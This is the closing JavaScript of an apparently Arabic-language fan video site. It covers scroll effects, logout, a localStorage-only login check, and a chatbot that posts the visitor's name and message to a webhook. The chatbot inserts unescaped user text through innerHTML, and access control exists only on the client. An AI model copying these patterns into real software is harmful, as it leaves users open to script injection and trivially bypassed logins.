                backToTopBtn.style.visibility = 'visible';
            } else {
                backToTopBtn.style.opacity = '0';
                backToTopBtn.style.visibility = 'hidden';
            }
            
            // Animation on scroll
            const scrollElements = document.querySelectorAll('.animate-on-scroll');
            scrollElements.forEach(el => {
                const elementTop = el.getBoundingClientRect().top;
                const isVisible = elementTop < window.innerHeight * 0.9;
                if (isVisible) {
                    el.classList.add('animated');
                }
            });
        });

        backToTopBtn.addEventListener('click', function() {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        });

        // Chatbot functionality
        chatbotButton.addEventListener('click', () => {
            chatbotModal.classList.remove('hidden');
        });
        
        closeChatbotModal.addEventListener('click', () => {
            chatbotModal.classList.add('hidden');
        });

        async function sendChatbotMessage() {
            const message = chatbotInput.value.trim();
            if (message === '') return;

            const userName = localStorage.getItem('inazuma-username') || 'زائر';
            
            const userMessageDiv = document.createElement('div');
            userMessageDiv.classList.add('flex', 'justify-end');
            userMessageDiv.innerHTML = `<div class="bg-yellow-500 text-gray-900 p-3 rounded-xl rounded-br-none max-w-[80%] shadow-md">${message}</div>`;
            chatMessages.appendChild(userMessageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: `**رسالة من ${userName}**: ${message}` }),
                });

                if (response.ok) {
                    const botReplyDiv = document.createElement('div');
                    botReplyDiv.classList.add('flex', 'justify-start');
                    botReplyDiv.innerHTML = `<div class="bg-[#3a3a88] p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">شكراً لك ${userName}! تم استلام رسالتك وسنعمل على مراجعتها.</div>`;
                    chatMessages.appendChild(botReplyDiv);
                    chatMessages.scrollTop = chatMessages.scrollHeight;
                } else {
                    showMessage('خطأ في الإرسال', 'حدث خطأ أثناء إرسال رسالتك. يرجى المحاولة لاحقاً.');
                }
            } catch (error) {
                showMessage('خطأ في الاتصال', 'حدث خطأ أثناء الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت.');
            }

            chatbotInput.value = '';
        }

        chatbotSendButton.addEventListener('click', sendChatbotMessage);
        chatbotInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                sendChatbotMessage();
            }
        });

        // تسجيل الخروج
        logoutButton.addEventListener('click', function() {
            localStorage.removeItem('inazuma-logged-in');
            localStorage.removeItem('inazuma-username');
            location.reload();
        });

        // عند تحميل الصفحة
        window.addEventListener('load', function() {
            renderClips(videoClips);
            
            // التحقق من حالة تسجيل الدخول
            const isLoggedIn = localStorage.getItem('inazuma-logged-in');
            const userName = localStorage.getItem('inazuma-username');
            
            if (isLoggedIn === 'true') {
                // إخفاء نافذة التسجيل
                loginModal.style.display = 'none';
                // إظهار المحتوى الرئيسي
                mainContent.classList.remove('hidden');
                
                // عرض رسالة ترحيب إذا كان هناك اسم مستخدم
                if (userName) {
                    showWelcomeMessage(userName);
                }
                
                // تشغيل الفيديو الأول بعد تأخير
                setTimeout(() => {
                    playVideo(0);
                }, 1500);
                
                // عرض رسالة التحذير إذا لم تكن قد ظهرت من قبل
                if (!localStorage.getItem('inazuma-warning-seen')) {
                    setTimeout(() => {
                        initialWarningModal.classList.remove('hidden');
                        localStorage.setItem('inazuma-warning-seen', 'true');
                    }, 2000);
                }
            } else {
                // إظهار نافذة التسجيل فقط
                loginModal.style.display = 'flex';
            }
            
            // إضافة تأثيرات للعناصر عند التمرير
            setTimeout(() => {
                const scrollElements = document.querySelectorAll('.animate-on-scroll');
                scrollElements.forEach(el => {
                    const elementTop = el.getBoundingClientRect().top;
                    const isVisible = elementTop < window.innerHeight * 0.9;
                    if (isVisible) {
                        el.classList.add('animated');
                    }
                });
            }, 500);
        });
    </script>
</body>
                                    </html>
